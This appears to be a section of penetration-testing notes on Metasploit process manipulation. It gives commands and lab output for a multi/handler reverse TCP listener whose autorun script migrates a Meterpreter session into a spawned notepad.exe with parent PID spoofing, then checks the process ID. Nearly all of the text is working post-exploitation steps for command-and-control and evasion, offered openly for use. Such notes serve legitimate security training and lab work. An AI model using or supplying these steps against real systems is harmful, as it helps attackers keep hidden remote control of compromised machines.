# 04 - Process Manipulation

Search Tag(s): #metasploit-framework #command-and-control #interactive-shell

## 4.1 - Migrate to Another Process

* Setting up listener to auto migrate to another process

```
msf exploit(multi/handler) > set lhost 10.0.2.4

msf exploit(multi/handler) > set lport 4444

msf exploit(multi/handler) > set autorunscript post/windows/manage/migrate name=notepad.exe

msf exploit(multi/handler) > exploit

[*] Started reverse TCP handler on 10.0.2.4:4444 
[*] Sending stage (200262 bytes) to 10.0.2.15
[*] Session ID 4 (10.0.2.4:4444 -> 10.0.2.15:49840 ) processing AutoRunScript 'post/windows/manage/migrate name=notepad.exe'
[*] Running module against DEFALT
[*] Current server process: powershell.exe (1136)
[*] Spawning notepad.exe process to migrate into
[*] Spoofing PPID 0
[*] Migrating into 1280
[+] Successfully migrated into process 1280
[*] Meterpreter session 4 opened (10.0.2.4:4444 -> 10.0.2.15:49840 ) at 2022-05-15 15:35:51 -0400
```

## 4.2 - Get Process ID

```
meterpreter > getpid
Current pid: 1280
```

---
## References

- [Pentestlab Blog: Parent PID Spoofing](https://pentestlab.blog/2020/02/24/parent-pid-spoofing/)